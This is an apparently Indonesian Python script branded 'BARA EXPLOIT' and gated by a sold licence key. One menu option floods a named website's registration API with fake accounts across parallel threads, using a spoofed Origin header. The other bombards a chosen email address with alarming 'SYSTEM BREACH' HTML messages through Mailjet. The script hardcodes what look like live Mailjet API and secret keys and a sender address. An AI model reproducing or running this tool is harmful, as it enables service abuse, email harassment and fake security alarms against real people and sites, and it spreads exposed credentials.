import requests
import random
import string
import time
import os
import sys
import json
import subprocess
import base64
from concurrent.futures import ThreadPoolExecutor

try:
    from colorama import init, Fore, Style
    init(autoreset=True)
except ImportError:
    print("[-] Install : pip install colorama requests")
    sys.exit()

# ==========================================
# KONFIGURASI
# ==========================================
TARGET_URL = "https://nova-wawa.vercel.app/api/register"
USED_KEYS_FILE = "used_keys.txt"

# --- KONFIGURASI MAILJET ---
MAILJET_API_KEY = "852c378f1a0e325dc8ef78279aa99858"
MAILJET_SECRET_KEY = "21d54f4567c06de75b11dc0a9c8d2153"
MAILJET_SENDER_EMAIL = "partosartini41@gmail.com" 
MAILJET_SENDER_NAME = "BARA EXPLOIT"

# Kode Warna ANSI
C_RED = '\033[91m'
C_GREEN = '\033[92m'
C_YELLOW = '\033[93m'
C_BLUE = '\033[94m'
C_MAGENTA = '\033[95m'
C_CYAN = '\033[96m'
C_WHITE = '\033[97m'
C_RESET = '\033[0m'
C_BOLD = '\033[1m'

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def animasi_banner():
    ascii_art = [
        "██████╗  █████╗ ██████╗  █████╗     ███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗",
        "██╔══██╗██╔══██╗██╔══██╗██╔══██╗    ██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝",
        "██████╔╝███████║██████╔╝███████║    █████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   ",
        "██╔══██╗██╔══██║██╔══██╗██╔══██║    ██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   ",
        "██████╔╝██║  ██║██║  ██║██║  ██║    ███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   ",
        "╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝    ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   "
    ]
    colors = [C_RED, C_YELLOW, C_GREEN, C_CYAN, C_BLUE, C_MAGENTA]
    
    for shift in range(20): 
        clear()
        print("\n")
        for i, line in enumerate(ascii_art):
            color_idx = (i + shift) % len(colors)
            print(f"{colors[color_idx]}{C_BOLD}{line}{C_RESET}")
        print(f"\n{C_WHITE}                        [ PREMIUM TOOLKING V3 ]{C_RESET}")
        print(f"{C_WHITE}                              Dev: BARA{C_RESET}\n")
        time.sleep(0.1)

def get_decrypted_keys():
    if not os.path.exists('get_key.js'):
        print(f"\n{C_RED}[❌] File get_key.js nggak ada di folder ini!{C_RESET}")
        return []
        
    try:
        result = subprocess.run(['node', 'get_key.js'], capture_output=True, text=True)
        if result.returncode != 0:
            print(f"\n{C_RED}[❌] Gagal decrypt apikey.js (Error Node.js).{C_RESET}")
            return []
        keys = json.loads(result.stdout)
        return keys
    except FileNotFoundError:
        print(f"\n{C_RED}[❌] Node.js belum keinstall! Jalanin: pkg install nodejs -y{C_RESET}")
        return []
    except Exception as e:
        print(f"\n{C_RED}[❌] Error sistem: {e}{C_RESET}")
        return []

def is_key_used(key):
    if not os.path.exists(USED_KEYS_FILE):
        return False
    with open(USED_KEYS_FILE, "r") as f:
        used = f.read().splitlines()
    return key in used

def mark_key_used(key):
    with open(USED_KEYS_FILE, "a") as f:
        f.write(key + "\n")

# ==========================================
# MENU 1: SPAM REGISTER
# ==========================================
def tembak_register():
    rand_str = ''.join(random.choices(string.ascii_lowercase, k=4))
    timestamp = int(time.time() * 1000) 
    prefix = random.choice(["User", "VIP", "Siswa", "Member", "Baru", "Bara", "Anon"])
    nama = f"{prefix}_{rand_str}"
    password = f"Qwerty{random.randint(100, 999)}!"
    
    payload = {
        "full_name": nama,
        "birth_year": str(random.randint(1990, 2006)),
        "email": f"{nama.lower()}_{timestamp}@gmail.com",
        "password": password,
        "agree": True
    }
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0",
        "Origin": "https://nova-wawa.vercel.app"
    }
    try:
        res = requests.post(TARGET_URL, json=payload, headers=headers, timeout=5)
        return res.status_code in [200, 201]
    except:
        return False

def eksekusi_spam(jumlah):
    print(f"\n{C_YELLOW}[*] Menyiapkan {jumlah} akun...{C_RESET}")
    time.sleep(0.5)
    start_time = time.time()
    sukses = 0
    print(f"{C_CYAN}[*] Menembak server...{C_RESET}")
    
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(tembak_register) for _ in range(jumlah)]
        for i, f in enumerate(futures):
            if f.result(): sukses += 1
            percent = int((i + 1) / jumlah * 100)
            sys.stdout.write(f"\r{C_GREEN}[Progress] {percent}% ({sukses} Sukses){C_RESET}")
            sys.stdout.flush()
            
    elapsed = time.time() - start_time
    print(f"\n\n{C_GREEN}======================================================{C_RESET}")
    print(f"{C_GREEN}[✅] SPAM SELESAI! Sukses: {sukses} | Gagal: {jumlah - sukses} | Waktu: {elapsed:.2f}s{C_RESET}")

# ==========================================
# MENU 2: SPAM EMAIL (MAILJET API - UI BARU)
# ==========================================
def kirim_email_mailjet(target, pesan):
    # UI Baru: Cyberpunk Neon Glassmorphism (Aman di Gmail)
    img_base64 = "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/x8AAwMCAO+ip1sAAAAASUVORK5CYII="

    html_content = f"""
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
    </head>
    <body style="margin: 0; padding: 0; background-color: #080808; font-family: 'Courier New', monospace;">
        <table width="100%" border="0" cellspacing="0" cellpadding="0" style="background-color: #080808; padding: 30px 15px;">
            <tr>
                <td align="center">
                    <table width="100%" max-width="550" border="0" cellspacing="0" cellpadding="30" style="background: linear-gradient(135deg, #1a001a 0%, #000000 100%); border: 2px solid #ff003c; border-radius: 15px; text-align: center; box-shadow: 0 0 30px rgba(255, 0, 60, 0.3);">
                        <tr>
                            <td>
                                <h1 style="color: #ff003c; font-size: 32px; margin: 0 0 20px 0; text-transform: uppercase; letter-spacing: 3px; text-shadow: 0 0 15px #ff003c, 0 0 30px #ff003c;">SYSTEM BREACH</h1>
                                
                                <!-- GAMBAR PLACEHOLDER -->
                                <img src="data:image/png;base64,{img_base64}" width="100%" style="max-height: 200px; object-fit: cover; border-radius: 8px; border: 1px solid #00e5ff; margin-bottom: 25px; display: block;" alt="System Hacked">
                                
                                <!-- KOTAK PESAN -->
                                <div style="background-color: rgba(0, 229, 255, 0.1); border-left: 5px solid #00e5ff; border-right: 5px solid #00e5ff; padding: 20px; text-align: left; color: #ffffff; font-size: 16px; margin-bottom: 30px; line-height: 1.6;">
                                    {pesan}
                                </div>
                                
                                <!-- FOOTER -->
                                <div style="font-size: 12px; color: #00e5ff; margin-top: 30px; border-top: 1px dashed #333333; padding-top: 20px; text-transform: uppercase; letter-spacing: 2px; text-shadow: 0 0 5px #00e5ff;">
                                    <strong>DEV: BARA</strong><br>
                                    <span style="color: #555555; font-size: 10px;">BARA EXPLOIT TOOLKING</span>
                                </div>
                            </td>
                        </tr>
                    </table>
                </td>
            </tr>
        </table>
    </body>
    </html>
    """
    
    auth_string = f"{MAILJET_API_KEY}:{MAILJET_SECRET_KEY}"
    auth_b64 = base64.b64encode(auth_string.encode()).decode()
    
    headers = {
        "Content-Type": "application/json",
        "Authorization": f"Basic {auth_b64}"
    }
    
    payload = {
        "Messages": [
            {
                "From": {"Email": MAILJET_SENDER_EMAIL, "Name": MAILJET_SENDER_NAME},
                "To": [{"Email": target}],
                "Subject": f"⚠️ WARNING: SYSTEM ALERT {random.randint(100, 999)}",
                "HTMLPart": html_content
            }
        ]
    }
    
    try:
        res = requests.post("https://api.mailjet.com/v3.1/send", headers=headers, json=payload, timeout=10)
        if res.status_code in [200, 201]:
            return True, "OK"
        else:
            return False, f"HTTP {res.status_code}: {res.text}"
    except Exception as e:
        return False, str(e)

def eksekusi_spam_email():
    clear()
    print(f"{C_CYAN}=== SPAM EMAIL (MAILJET API) ==={C_RESET}")
    target = input(f"{C_YELLOW}Email Target: {C_RESET}")
    pesan = input(f"{C_YELLOW}Pesan: {C_RESET}")
    try:
        jumlah = int(input(f"{C_YELLOW}Jumlah spam: {C_RESET}"))
    except:
        return

    print(f"\n{C_YELLOW}[*] Memproses...{C_RESET}")
    sukses = 0
    for i in range(1, jumlah + 1):
        berhasil, error_msg = kirim_email_mailjet(target, pesan)
        if berhasil:
            sukses += 1
            print(f"{C_GREEN}[✅] [{i}/{jumlah}] Terkirim!{C_RESET}")
        else:
            print(f"{C_RED}[❌] [{i}/{jumlah}] Gagal: {error_msg}{C_RESET}")
        time.sleep(1.5) 
        
    print(f"\n{C_GREEN}[✅] Selesai! Sukses: {sukses}/{jumlah}{C_RESET}")

# ==========================================
# MAIN MENU
# ==========================================
def main():
    animasi_banner()
    
    print(f"{C_CYAN}[*] Membaca API Key lewat Node.js...{C_RESET}")
    valid_keys = get_decrypted_keys()
    if not valid_keys:
        print(f"\n{C_RED}[❌] Gagal load API Key. Cek error di atas.{C_RESET}")
        sys.exit()

    print(f"{C_YELLOW}Masukkan API TOKEN: {C_RESET}")
    user_key = input("> ").strip()

    if user_key not in valid_keys:
        print(f"\n{C_RED}[❌] API KEY TIDAK VALID! Akses Ditolak.{C_RESET}")
        sys.exit()

    if is_key_used(user_key):
        print(f"\n{C_RED}[❌] API KEY SUDAH DIPAKAI! Key hangus.{C_RESET}")
        sys.exit()

    mark_key_used(user_key)
    print(f"{C_GREEN}[✅] API KEY VALID!{C_RESET}")
    time.sleep(1)

    while True:
        clear()
        m_c = [C_CYAN, C_MAGENTA, C_GREEN][int(time.time()) % 3]
        
        print(f"""{m_c}
======================================================
                BARA EXPLOIT - MAIN MENU
======================================================
{C_YELLOW}1. {C_WHITE}Spam Register (Nova Wawa)
{C_YELLOW}2. {C_WHITE}Spam Email (Mailjet API)
{C_YELLOW}0. {C_WHITE}Keluar
{m_c}======================================================
{C_WHITE}Dev: BARA | Key: {user_key[:5]}***{C_RESET}""")
        
        pilihan = input(f"{C_YELLOW}Pilih menu (0-2): {C_RESET}").strip()

        if pilihan == '1':
            try:
                jml = int(input(f"{C_YELLOW}Jumlah spam (max 500): {C_RESET}"))
                eksekusi_spam(jml)
            except: pass
            input(f"\n{C_CYAN}Tekan Enter...{C_RESET}")
        elif pilihan == '2':
            eksekusi_spam_email()
            input(f"\n{C_CYAN}Tekan Enter...{C_RESET}")
        elif pilihan == '0':
            print(f"{C_RED}[!] Keluar...{C_RESET}")
            sys.exit()
        else:
            print(f"{C_RED}[!] Pilihan tidak valid!{C_RESET}")
            time.sleep(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{C_RED}[!] Dihentikan sama user. Kabur lek!{C_RESET}")
        sys.exit()
